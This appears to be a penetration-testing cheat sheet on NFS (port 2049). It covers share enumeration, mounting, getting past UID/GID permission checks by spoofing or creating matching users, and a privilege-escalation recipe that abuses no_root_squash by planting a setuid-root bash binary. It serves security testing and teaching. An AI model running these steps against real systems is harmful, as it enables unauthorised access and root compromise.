# 2049 - NFS

## Theory

Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a user on a client computer to access files over a computer network as if they were on locally mounted storage.

NFS is often used with UNIX operating systems and is predominantly insecure in its implementation. It can be somewhat difficult to set up securely, so it is not uncommon to find NFS shares open to the world. This is quite convenient for us as penetration testers, as we might be able to exploit them to collect sensitive information, escalate our privileges, etc.

## Enumeration

### List NFS shares

```bash
showmount -e <IP>
```

This will show us the available shares. It can be something like this: `/ *` (the whole system), `/var/www/*` (everything in /var/www), etc.

### Scan NFS

```bash
nnmap --script='nfs-*' -p<PORT> <IP> -oN nfs_scan
```

### Set up an NFS

{% tabs %}
{% tab title="Methods" %}
```bash
mkdir /mnt/nfs # We create a directory.

# Ways of mounting:
mount -t nfs <IP>:<SHARE> /mnt/nfs
mount -t nfs <IP>:<SHARE> /mnt/nfs -o nolock # The "-o nolock", is to disable file locking, which is often necessary for older NFS servers.
mount <IP>:<SHARE> /mnt/nfs
mount -t nfs -o vers=3 <IP>:<SHARE> /mnt/nfs # NFS version 3

# At the end, we do:
umount /mnt/nfs
```
{% endtab %}

{% tab title="Troubleshooting" %}
If running `ls -l /mnt/nfs/<SHARE>` tells us "Permission Denied", this may be because the UID and GID are not the same (we can verify this with `stat /mnt/nfs/<SHARE>`) since the way NFS works with permissions is as follows: to access a locally mounted share, its uid and gid must match those of the shared directory on the server. Yes, that's it. Unfortunately, for "security" reasons, NFS 4 does not show the actual remote uid and gid, but those corresponding to the nobody user and group.

### Solution 1

If we have the ability to see the actual remote UID and GID of the mount owner, we can create a user and group with those same identifiers (remember that NFS 3 does show the UID and GID remotely, while NFS 4 does not):

```bash
# We create the group and user with their respective real identifiers:
groupadd --gid <GID> nfs4_group
useradd --uid <UID> --groups nfs4_group nfs4_user
sudo -u nfs4_user ls -l <SHARE>
sudo passwd nfs4_user # Assign a password.
su nfs4_user # Get a shell as that user.

# CleanUp:
sudo groupdel nfs4_group
sudo userdel nfs4_user
```

### Solution 2

Another solution is to use NfSpy, which essentially automates the above process (but spoofs the uid and gid instead of actually creating a user).

```bash
nfspy -o server=<IP>:<SHARE>,nfsport=2049/tcp,rw /mnt/nfs/
ls -l /mnt/nfs/
```

### Solution 3 (NFSShell)

To easily list, mount and change the UID and GID to access the files you can use [nfsshell](https://github.com/NetDirect/nfsshell). Good tutorial on [NFSShell](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/).
{% endtab %}
{% endtabs %}

## Config files

```bash
/etc/exports
/etc/lib/nfs/etab
```

## Privilege Escalation

```bash
# Detection:
cat /etc/exports
/tmp *(rw,fsid=0,sync,no_root_squash,insecure)
```

If the file has the no\_root\_squash option and the directory we can mount has write permissions, then we can escalate privileges.

```bash
# On the compromised machine:
cp /bin/bash <SHARE>/bash
# On the attacker machine:
Mount NFS.
cd /mnt/nfs
sudo chown root:root bash
sudo chmod 4755 bash
# On the compromised machine:
/tmp/bash -p
```

### Troubleshooting

If you get an error similar to this one:

```bash
mount.nfs: mounting 127.0.0.1:/tmp failed, reason given by server: No such file or directory
```

It may be that it really has nothing to do with the directory, but that the NFS server needs an additional port that it is not finding. This usually happens when we are pivoting or port forwarding. An example would be the following:

* We perform a port forwarding of **2049** (NFS) and **111** (rpcinfo) and get the error shown above. To try to resolve this, we can use Wireshark and see what is going on:

{% hint style="warning" %}
We are going to capture packets from interface 127.0.0.1 (loopback), since we are tunneling traffic through there.
{% endhint %}

![](../.gitbook/assets/error\_mount\_nfs.png)

We see that our computer is trying to connect to the server on port 20048 but fails to receive a connection. This is because in the port forwarding we did not specify that particular port.
